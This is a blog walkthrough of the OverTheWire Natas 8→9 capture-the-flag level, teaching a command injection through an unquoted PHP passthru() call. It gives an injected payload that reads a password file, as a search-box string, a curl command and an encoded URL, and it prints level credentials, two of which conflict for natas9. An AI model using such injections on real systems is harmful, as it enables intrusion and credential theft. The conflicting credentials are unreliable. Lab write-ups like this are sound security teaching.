---
layout: post-with-comments
title: "OverTheWire Natas Level 8 → 9 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-8-to-9/
tags: [overthewire, natas, walkthrough, ctf, web, beginner]
description: "A step by step tutorial for OverTheWire Natas Level 8 → 9!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-7-to-8/' | relative_url }}">← Previous: Level 7 → 8</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas9.html" target="_blank" rel="noopener">
      Official (Level 9) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-9-to-10/' | relative_url }}">
      Next: Level 9 → 10 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas9.natas.labs.overthewire.org](http://natas9.natas.labs.overthewire.org)  
Credentials: **natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t**

```bash
# Using curl (optional):
curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t http://natas9.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-8-to-9/homepage.jpg' | relative_url }})

## Task

The page provides a **search** box. Viewing the source shows the backend command it runs.

## A little bit of Theory

From the source (`index-source.html`), simplified PHP:

```php
<?php
$key = "";
if (array_key_exists("needle", $_REQUEST)) {
  $key = $_REQUEST["needle"];
}
if ($key != "") {
  passthru("grep -i $key dictionary.txt");
}
```

* `passthru()` executes a **shell command**.
* User input is concatenated straight into the command without quoting.
* That enables **command injection**: we can terminate the `grep` and run our own command using `;`.

**Further reading:**

* <a href="https://www.php.net/manual/en/function.passthru.php" target="_blank" rel="noopener">PHP: `passthru`</a>
* <a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank" rel="noopener">OWASP: Command Injection</a>

## Solution

1. **Open the source** and confirm the `passthru("grep -i $key dictionary.txt");` line.

   ![source]({{ '/assets/images/natas/level-8-to-9/code.jpg' | relative_url }})

2. **Inject a second command** to read the next level’s password file.

   Payload for the search box:

   ```
   ; cat /etc/natas_webpass/natas10
   ```

   If you prefer `curl`, remember to URL-encode or use `--data-urlencode`:

   ```bash
   curl -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl \
     --data-urlencode 'needle=; cat /etc/natas_webpass/natas10' \
     http://natas9.natas.labs.overthewire.org/
   ```

3. **Read the output**: the page prints the file contents under the search results.

   ![success]({{ '/assets/images/natas/level-8-to-9/success.jpg' | relative_url }})

## Password

```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

**Troubleshooting**

* Your browser ate the semicolon? → Use `--data-urlencode` with curl or type `%3B` instead of `;` in the URL.
* Only seeing grep errors? → Ensure there’s a leading `;` (it terminates the `grep` command).
* Still stuck? → Try this full URL form:
  `http://natas9.natas.labs.overthewire.org/?needle=%3B%20cat%20/etc/natas_webpass/natas10`

---

**Boom 🎉** You just exploited a classic command injection to steal the next level’s password. On to **natas10**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
